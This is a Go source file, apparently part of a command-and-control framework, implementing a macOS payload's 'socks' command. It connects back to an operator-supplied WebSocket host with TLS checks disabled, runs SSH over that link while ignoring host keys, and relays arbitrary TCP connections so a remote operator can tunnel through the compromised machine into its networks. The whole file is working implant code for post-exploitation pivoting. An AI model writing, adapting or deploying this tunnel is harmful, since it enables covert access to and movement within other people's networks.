// server/docker/payloads/Darwin/action_socks.go

//go:build darwin
// +build darwin

package main

import (
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	"golang.org/x/crypto/ssh"
)

type SocksCommand struct {
	wsConn    *websocket.Conn
	sshClient *ssh.Client
	running   bool
	mu        sync.RWMutex
}

func (c *SocksCommand) Name() string {
	return "socks"
}

func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	log.Printf("[SOCKS] Execute called with %d args", len(args))

	// Get the JSON data from the CurrentCommand in context
	var rawData string

	ctx.mu.RLock()
	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
		rawData = ctx.CurrentCommand.Data
		log.Printf("[SOCKS] Got data from CurrentCommand.Data")
	}
	ctx.mu.RUnlock()

	if rawData == "" {
		log.Printf("[SOCKS] ERROR: No JSON data found in command")
		return CommandResult{
			Error:       fmt.Errorf("no SOCKS configuration data"),
			ErrorString: "No SOCKS configuration data provided",
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	log.Printf("[SOCKS] Parsing configuration...")

	var socksData struct {
		Action      string `json:"action"`
		SocksPort   int    `json:"socks_port"`
		WSSPort     int    `json:"wss_port"`
		WSSHost     string `json:"wss_host"`
		Path        string `json:"path"`
		Credentials struct {
			Username string `json:"username"`
			Password string `json:"password"`
			SSHKey   string `json:"ssh_key"`
		} `json:"credentials"`
	}

	if err := json.Unmarshal([]byte(rawData), &socksData); err != nil {
		log.Printf("[SOCKS] ERROR: Failed to unmarshal JSON: %v", err)
		return CommandResult{
			Error:       err,
			ErrorString: fmt.Sprintf("failed to parse socks config: %v", err),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	log.Printf("[SOCKS] Config - Action: %s, WSSHost: %s, WSSPort: %d, Path: %s",
		socksData.Action, socksData.WSSHost, socksData.WSSPort, socksData.Path)

	switch socksData.Action {
	case "start":
		log.Printf("[SOCKS] Starting SOCKS tunnel client...")

		// Configure dialer with TLS settings
		dialer := websocket.Dialer{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
			HandshakeTimeout:  10 * time.Second,
			EnableCompression: false,
		}

		// Build WebSocket URL
		wsURL := fmt.Sprintf("wss://%s:%d%s",
			socksData.WSSHost,
			socksData.WSSPort,
			socksData.Path,
		)
		log.Printf("[SOCKS] Connecting to WebSocket: %s", wsURL)

		wsConn, resp, err := dialer.Dial(wsURL, nil)
		if err != nil {
			log.Printf("[SOCKS] ERROR: WebSocket connection failed: %v", err)
			if resp != nil {
				respBody, _ := io.ReadAll(resp.Body)
				log.Printf("[SOCKS] Response: %s", string(respBody))
				resp.Body.Close()
			}
			return CommandResult{
				Error:       err,
				ErrorString: fmt.Sprintf("failed to establish WebSocket connection: %v", err),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		log.Printf("[SOCKS] WebSocket connected successfully")

		// Configure SSH client
		sshConfig := &ssh.ClientConfig{
			User: socksData.Credentials.Username,
			Auth: []ssh.AuthMethod{
				ssh.Password(socksData.Credentials.Password),
			},
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			Timeout:         10 * time.Second,
		}

		// Add SSH key authentication if provided
		if socksData.Credentials.SSHKey != "" {
			log.Printf("[SOCKS] Decoding SSH key...")
			keyBytes, err := base64.StdEncoding.DecodeString(socksData.Credentials.SSHKey)
			if err != nil {
				log.Printf("[SOCKS] Failed to decode SSH key: %v", err)
			} else {
				signer, err := ssh.ParsePrivateKey(keyBytes)
				if err == nil {
					sshConfig.Auth = append(sshConfig.Auth, ssh.PublicKeys(signer))
					log.Printf("[SOCKS] SSH key authentication added")
				} else {
					log.Printf("[SOCKS] Failed to parse SSH key: %v", err)
				}
			}
		}

		log.Printf("[SOCKS] Starting SSH handshake as user: %s", socksData.Credentials.Username)

		// Wrap WebSocket connection for SSH
		wrapped := &wsConnWrapper{conn: wsConn}
		sshConn, chans, reqs, err := ssh.NewClientConn(wrapped, "", sshConfig)
		if err != nil {
			log.Printf("[SOCKS] ERROR: SSH handshake failed: %v", err)
			wsConn.Close()
			return CommandResult{
				Error:       err,
				ErrorString: fmt.Sprintf("failed SSH handshake: %v", err),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		log.Printf("[SOCKS] SSH tunnel established successfully")

		// Store connections before creating client
		c.mu.Lock()
		c.wsConn = wsConn
		c.running = true
		c.mu.Unlock()

		// Handle incoming channel requests (for forwarding)
		go c.handleChannels(chans)

		// Handle global requests
		go ssh.DiscardRequests(reqs)

		// Keep SSH connection alive (don't create a client that consumes channels)
		go c.keepAlive(sshConn)

		log.Printf("[SOCKS] SOCKS tunnel ready - C2 port %d is now tunneled through this payload", socksData.SocksPort)

		return CommandResult{
			Output:      fmt.Sprintf("SOCKS tunnel established - C2 port %d is forwarding through this payload", socksData.SocksPort),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}

	case "stop":
		log.Printf("[SOCKS] Stopping SOCKS tunnel...")

		c.mu.Lock()
		if c.sshClient != nil {
			c.sshClient.Close()
		}
		if c.wsConn != nil {
			c.wsConn.Close()
		}
		c.running = false
		c.mu.Unlock()

		log.Printf("[SOCKS] SOCKS tunnel stopped")
		return CommandResult{
			Output:      "SOCKS tunnel stopped",
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}

	default:
		return CommandResult{
			Error:       fmt.Errorf("unknown socks action: %s", socksData.Action),
			ErrorString: fmt.Sprintf("unknown socks action: %s", socksData.Action),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
}

func (c *SocksCommand) keepAlive(sshConn ssh.Conn) {
	for {
		c.mu.RLock()
		running := c.running
		c.mu.RUnlock()

		if !running {
			break
		}

		time.Sleep(30 * time.Second)

		// Send keepalive request
		_, _, err := sshConn.SendRequest("keepalive@golang.org", true, nil)
		if err != nil {
			log.Printf("[SOCKS] SSH connection lost: %v", err)
			break
		}
	}
}

func (c *SocksCommand) handleChannels(chans <-chan ssh.NewChannel) {
	log.Printf("[SOCKS] Ready to handle forwarding channels")

	for newChannel := range chans {
		go c.handleChannelOpen(newChannel)
	}

	log.Printf("[SOCKS] Channel handler stopped")
}

func (c *SocksCommand) handleChannelOpen(newChannel ssh.NewChannel) {
	log.Printf("[SOCKS] Received channel request type: %s", newChannel.ChannelType())

	if newChannel.ChannelType() != "direct-tcpip" {
		log.Printf("[SOCKS] Rejecting unknown channel type: %s", newChannel.ChannelType())
		newChannel.Reject(ssh.UnknownChannelType, "unknown channel type")
		return
	}

	// Parse the forwarding request
	var req struct {
		DestAddr   string
		DestPort   uint32
		OriginAddr string
		OriginPort uint32
	}

	if err := ssh.Unmarshal(newChannel.ExtraData(), &req); err != nil {
		log.Printf("[SOCKS] Failed to parse channel request: %v", err)
		newChannel.Reject(ssh.ConnectionFailed, "failed to parse request")
		return
	}

	// The DestAddr contains the target address (host:port)
	target := req.DestAddr
	log.Printf("[SOCKS] Connecting to target: %s", target)

	// Connect to the target
	targetConn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		log.Printf("[SOCKS] Failed to connect to %s: %v", target, err)
		newChannel.Reject(ssh.ConnectionFailed, fmt.Sprintf("failed to connect: %v", err))
		return
	}

	// Accept the channel
	channel, requests, err := newChannel.Accept()
	if err != nil {
		log.Printf("[SOCKS] Failed to accept channel: %v", err)
		targetConn.Close()
		return
	}

	log.Printf("[SOCKS] Channel accepted, starting proxy for %s", target)

	// Handle channel requests
	go ssh.DiscardRequests(requests)

	// Proxy data between channel and target
	var wg sync.WaitGroup
	wg.Add(2)

	// Channel -> Target
	go func() {
		defer wg.Done()
		defer targetConn.Close()
		bytes, err := io.Copy(targetConn, channel)
		if err != nil && err != io.EOF {
			log.Printf("[SOCKS] Channel->Target error for %s: %v", target, err)
		}
		log.Printf("[SOCKS] Channel->Target transferred %d bytes for %s", bytes, target)
	}()

	// Target -> Channel
	go func() {
		defer wg.Done()
		defer channel.Close()
		bytes, err := io.Copy(channel, targetConn)
		if err != nil && err != io.EOF {
			log.Printf("[SOCKS] Target->Channel error for %s: %v", target, err)
		}
		log.Printf("[SOCKS] Target->Channel transferred %d bytes for %s", bytes, target)
	}()

	wg.Wait()
	log.Printf("[SOCKS] Connection closed for %s", target)
}

// WebSocket wrapper to implement net.Conn interface
type wsConnWrapper struct {
	conn *websocket.Conn
	buf  []byte
}

func (w *wsConnWrapper) Read(b []byte) (n int, err error) {
	if len(w.buf) == 0 {
		_, message, err := w.conn.ReadMessage()
		if err != nil {
			return 0, err
		}
		w.buf = message
	}

	n = copy(b, w.buf)
	w.buf = w.buf[n:]
	return n, nil
}

func (w *wsConnWrapper) Write(b []byte) (n int, err error) {
	err = w.conn.WriteMessage(websocket.BinaryMessage, b)
	if err != nil {
		return 0, err
	}
	return len(b), nil
}

func (w *wsConnWrapper) Close() error {
	return w.conn.Close()
}

func (w *wsConnWrapper) LocalAddr() net.Addr {
	return w.conn.LocalAddr()
}

func (w *wsConnWrapper) RemoteAddr() net.Addr {
	return w.conn.RemoteAddr()
}

func (w *wsConnWrapper) SetDeadline(t time.Time) error {
	if err := w.conn.SetReadDeadline(t); err != nil {
		return err
	}
	return w.conn.SetWriteDeadline(t)
}

func (w *wsConnWrapper) SetReadDeadline(t time.Time) error {
	return w.conn.SetReadDeadline(t)
}

func (w *wsConnWrapper) SetWriteDeadline(t time.Time) error {
	return w.conn.SetWriteDeadline(t)
}
